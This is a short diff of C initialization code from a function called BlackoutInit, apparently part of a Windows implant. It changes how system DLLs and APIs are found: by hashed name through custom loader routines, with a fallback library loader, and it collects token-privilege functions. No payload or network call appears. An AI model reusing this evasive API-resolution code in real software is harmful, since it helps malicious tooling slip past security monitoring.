@@ -17,9 +17,9 @@ FUNC VOID BlackoutInit(
 
     Instance()->Teb = NtCurrentTeb();
 
-    Instance()->Modules.Kernel32   = LdrModuleAddr( H_MODULE_KERNEL32 );
-    Instance()->Modules.Kernelbase = LdrModuleAddr( H_MODULE_KERNELBASE );
-    Instance()->Modules.Ntdll      = LdrModuleAddr( H_MODULE_NTDLL );
+    Instance()->Modules.Kernel32   = LdrModuleAddr( HASH_STR( "KERNEL32.DLL" ) );
+    Instance()->Modules.Kernelbase = LdrModuleAddr( HASH_STR( "KERNELBASE.dll" ) );
+    Instance()->Modules.Ntdll      = LdrModuleAddr( HASH_STR( "ntdll.dll" ) );
 
     Instance()->Win32.LoadLibraryA   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
     Instance()->Win32.GetProcAddress = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );
@@ -138,11 +138,17 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.NtOpenThreadToken         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadToken" ) ); 
     Instance()->Win32.NtOpenThreadTokenEx       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtOpenThreadTokenEx" ) ); 
 
-    Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
-    Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
-    Instance()->Modules.Msvcrt       = Instance()->Win32.LoadLibraryA( "Msvcrt.dll"   );
-    Instance()->Modules.Cryptbase    = Instance()->Win32.LoadLibraryA( "Cryptbase.dll" );
-    Instance()->Modules.Iphlpapi     = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );
+    Instance()->Modules.Winhttp   = LdrModuleAddr( HASH_STR( "Winhttp.dll" ) );
+    Instance()->Modules.Advapi32  = LdrModuleAddr( HASH_STR( "Advapi32.dll" ) );
+    Instance()->Modules.Msvcrt    = LdrModuleAddr( HASH_STR( "msvcrt.dll" ) );
+    Instance()->Modules.Cryptbase = LdrModuleAddr( HASH_STR( "Cryptbase.dll" ) ); 
+    Instance()->Modules.Iphlpapi  = LdrModuleAddr( HASH_STR( "IPHLPAPI.DLL" ) );
+
+    if ( !Instance()->Modules.Winhttp   ) Instance()->Modules.Winhttp   = LdrLoadLib( L"Winhttp.dll"   );
+    if ( !Instance()->Modules.Advapi32  ) Instance()->Modules.Advapi32  = LdrLoadLib( L"Advapi32.dll"  );
+    if ( !Instance()->Modules.Msvcrt    ) Instance()->Modules.Msvcrt    = LdrLoadLib( L"Msvcrt.dll"    );
+    if ( !Instance()->Modules.Cryptbase ) Instance()->Modules.Cryptbase = LdrLoadLib( L"Cryptbase.dll" );
+    if ( !Instance()->Modules.Iphlpapi  ) Instance()->Modules.Iphlpapi  = LdrLoadLib( L"Iphlpapi.dll"  );
 
     Instance()->Win32.AdjustTokenPrivileges = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "AdjustTokenPrivileges" ) );
     Instance()->Win32.LookupPrivilegeValueA = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "LookupPrivilegeValueA" ) );
